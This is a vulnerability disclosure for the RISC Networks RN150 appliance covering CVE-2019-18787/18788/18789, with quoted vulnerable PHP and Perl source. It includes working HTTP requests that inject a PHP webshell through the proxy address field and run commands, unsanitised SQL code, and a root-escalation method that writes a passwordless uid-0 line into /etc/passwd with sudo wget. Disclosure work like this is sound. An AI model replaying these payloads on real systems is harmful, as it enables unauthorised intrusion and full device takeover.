## Technical Details

### Unauthenticated Arbitrary File Write (CVE-2019-18787)

The RISC Networks RN150 allows an unauthenticated user to make requests to the `proxy_setup.php` file which is used for enabling, disabling, and configuring system-wide proxy settings for the appliance. This allows an unauthenticated attacker to write to the filesystem and gain arbitrary code execution.

```
<?php
    require_once 'util.php'; 

    $operation = 'modify';
    if (isset($_POST['operation']) and ($_POST['operation'] != "")) {
        $operation = $_POST['operation'];
    }
    
    // if we are passed a form where ipaddress is not populated, interpret this as a removal operation
    if ((isset($_POST['address'])) and ($_POST['address'] == "")) {
        $operation = 'disable';
    }
<snip>
        $cred = array(
            "address"   => $_POST['address'],
            "httpport"  => $_POST['httpport'],
            "httpsport" => $_POST['httpsport'],
            "authenticate"  => $authenticate,
            "ntlm"      => $ntlm,
            "username"  => $username,
            "password"  => $password,
            "enabled"   => 1
        );

        if ($operation == 'enable') {
            $result = enableProxy($cred);
        }
```
The source above takes in an `address`, an `httpport`, and an `httpsport`. If the `$operation` variable is set to `enable` it then passes the proxy configuration values to the `enableProxy` function located in the `util.php` file:

```
function enableProxy($cred) {
    if (!isset($cred['username']) or ($cred['username'] == '')) {
        $cred['username'] = null;
    }
    if (!isset($cred['password']) or ($cred['password'] == '')) {
        $cred['password'] = null;
    }
    $query = "insert into proxy (address,httpport,httpsport,authenticate,ntlm,username,password,enabled) values (?,?,?,?,?,?,?,?)";
    $conn = connectDB2();
    $stmt = mysqli_prepare($conn,$query);
    mysqli_stmt_bind_param($stmt,"siiiissi",$cred['address'],$cred['httpport'],$cred['httpsport'],$cred['authenticate'],$cred['ntlm'],$cred['username'],$cred['password'],$cred['enabled']);
    mysqli_stmt_execute($stmt);
    $proxyid = mysqli_insert_id($conn);
    mysqli_close($conn);

    $cmd = "sudo ./shell/enableProxy.pl 'enable $proxyid'";
    logAction("enableProxy(): $cmd");
    $res = trim(shell_exec($cmd));
    logAction("enableProxy(): $res");
    return $res;
}
```

The `enableProxy` function takes in the proxy configuration values, stores them in the backend database associated with a `proxyid`, and then calls the external Perl script `./shell/enableProxy.pl` passing the `$proxyid`.

```
sub enable_proxy {
    my $proxyid = shift;

    my $db = riscUtility::getDBH('risc_discovery',1);
    my $config = $db->selectrow_hashref("select * from proxy where id = $proxyid and enabled = 1");
<snip>
$httpproxy = "http://$config->{'address'}:$config->{'httpport'}";
$httpsproxy = "https://$config->{'address'}:$config->{'httpsport'}";
$HTTPPROXY = $httpproxy;
$HTTPSPROXY = $httpsproxy;

<snip>
## open /etc/riscenvironment for writing, sourced by /etc/profile
my $fh;
open($fh,">>","/etc/riscenvironment");
print $fh "export http_proxy=\"$httpproxy\"\n";
print $fh "export https_proxy=\"$httpsproxy\"\n";
print $fh "export HTTP_PROXY=\"$HTTPPROXY\"\n";
print $fh "export HTTPS_PROXY=\"$HTTPSPROXY\"\n";
print $fh "export HTTPS_PROXY_USERNAME=\"$HTTPSUSER\"\n";
print $fh "export HTTPS_PROXY_PASSWORD=\"$HTTPSPASS\"\n";
close($fh);
## open /etc/environment for writing, used by cron jobs
open($fh,">>","/etc/environment");
print $fh "http_proxy=\"$httpproxy\"\n";
print $fh "https_proxy=\"$httpsproxy\"\n";
print $fh "HTTP_PROXY=\"$HTTPPROXY\"\n";
print $fh "HTTPS_PROXY=\"$HTTPSPROXY\"\n";
print $fh "HTTPS_PROXY_USERNAME=\"$HTTPSUSER\"\n";
print $fh "HTTPS_PROXY_PASSWORD=\"$HTTPSPASS\"\n";
close($fh);
## open /srv/httpd/htdocs/proxy-config.php for writing, used by PHP
open($fh,">>","/srv/httpd/htdocs/proxy-config.php");
print $fh "<?php\n";
print $fh "\tputenv('http_proxy=$httpproxy');\n";
print $fh "\tputenv('https_proxy=$httpsproxy');\n";
close($fh);
```
The code above from the `enableProxy.pl` script queries the database for the configuration values associated with the supplied `$proxyid` and then writes these values to the files `/etc/riscenvironment`, `/etc/environment`, and `/srv/httpd/htdocs/proxy-config.php`. At no point do these values get sanitized, allowing for writing arbitrary content:

Write Webshell:
```
POST /proxy_setup.php HTTP/1.1
Host: 192.168.0.77
Content-Type: application/x-www-form-urlencoded
Content-Length: 92

operation=enable&address=127.0.0.1');system($_GET["atredis"]);//&httpport=80&httpsport=443
```

Execute Code:

```
GET /proxy-config.php?atredis=id HTTP/1.1
Host: 192.168.0.77
Connection: close
Content-Length: 2
```

Response:

```
HTTP/1.1 200 OK
Date: Wed, 10 Jul 2019 11:49:27 GMT
Server: Apache
Content-Length: 96
Connection: close
Content-Type: text/html; charset=UTF-8

uid=48(apache) gid=48(apache) groups=48(apache)
uid=48(apache) gid=48(apache) groups=48(apache)
```

The webshell can be removed by calling `proxy_setup.php` with the `operation` value set to `disable`.

Remove `proxy-config.php` file:

```
POST /proxy_setup.php HTTP/1.1
Host: 192.168.0.77
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

operation=disable
```

Response:

```
HTTP/1.1 200 OK

Successfully removed proxy configuration
```

The file write to `/etc/riscenvironment` can also be used to gain remote access when a user logs into the appliance because the `/etc/profile` file contains the following:

```
if [ -e /etc/riscenvironment ];then
        source /etc/riscenvironment
fi
```

### Unauthenticated SQL Injection (CVE-2019-18788)

The RISC Networks RN150 allows an unauthenticated user to make requests to the `dashboardconfirm.php` file. This allows for an unauthenticated attacker to perform arbitrary SQL queries on the backend MySQL database.

```
<?php
    session_start();
    require_once 'util.php';
    foreach($_GET as $key=>$val){
        urldecode($val);
    }
    clean_post_input($_GET);
//  print $_GET['applianceStatus'];
    
    if (isset($_GET['inventory'])) {
        setUpdatingInventory($_GET['inventory']);
        exit;
    }
```

The code above shows that the `inventory` parameter is processed via a `GET` request to the appliance. The value of all `GET` requests are passed through the `clean_post_input` function which can be found in `util.php`:

```
/*
 * takes an array of values(such as post array) and cleans each value
 *
 * @param array $post
 *
 * @return array clean $post
 */
function clean_post_input($post){
    foreach ($post as $key => $val){
        //urldecode(clean_input($val));
        clean_input($val);
    }
    return $post;
}
```

This function runs each parameter value through the `clean_input` function also found in `util.php`:

```
 * Clean Input to prevent xss
 *
 * @param string $input
 *
 * @return string clean $input
*/
function clean_input($input) {
    $input = htmlspecialchars($input, ENT_COMPAT, "UTF-8");
    $input = str_ireplace("&amp;", "&", $input);
    return $input;
}
```

The `clean_input` function above runs the values through the built-in PHP function `htmlspecialchars`; however, this function does not guard against SQL injection attacks.

Going back to the code in `dashboardconfirm.php`, `$_GET["inventory"]` is passed to `setUpdatingInventory` which can be found in `util.php`:

```
 function setUpdatingInventory($iStatus) {
    $query = "update discotype set status = $iStatus";
    $conn = connectDB2();
    $result = mysqli_query($conn, $query);
    if(!$result)  {
        risc_debugger();
        risc_db_issue_reporting($conn,'discotype');
    }
    mysqli_close($conn);
}
```

The code above shows that the input passed to the `setUpdatingInventory` function is used directly without sanitization in the SQL query, resulting in a SQL injection vulnerability.

### Privilege Escalation via Insecure sudo Rules (CVE-2019-18789)

The RISC Networks RN150 uses the following `sudo` rules for the `apache` user, allowing for privilege escalation from the `apache` user to the `root` user.

```
User apache may run the following commands on this host:
    (root) NOPASSWD: /sbin/dhclient, (root) /sbin/ifconfig, (root) /sbin/ip,
    (root) /sbin/ethtool, (root) /usr/bin/wget, (root) /sbin/arp, (root)
    /bin/traceroute, (root) /sbin/service, (root) /usr/bin/gpg, (root)
    /srv/httpd/htdocs/shell/testsyncnode.pl, (root)
    /srv/httpd/htdocs/shell/connectToPod.pl, (root)
    /srv/httpd/htdocs/shell/setPort.pl, (root)
    /srv/httpd/htdocs/shell/advDebugging.pl, (root)
    /srv/httpd/htdocs/shell/testGenSrvSSH.pl, (root)
    /srv/httpd/htdocs/shell/setKeyPermissions.sh, (root)
    /srv/httpd/htdocs/shell/enableProxy.pl, (root)
    /srv/httpd/htdocs/shell/remap-newassessment.pl
```

The `/usr/bin/wget` command when run in a privileged context can be used to overwrite files using the `--output-document` (`-O`) argument that can result in privilege escalation. One such method is to overwrite the `/etc/passwd` file with a modified version that includes a new user with `uid` and `gid` set to `0`:

```
atredis::0:0::/root:/bin/bash
```

Once written, the `apache` user can then `su` to the newly created user:

```
bash-4.1$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-4.1$ su atredis
root@RN150-192.168.0.77:[/srv/httpd/htdocs]:$
```
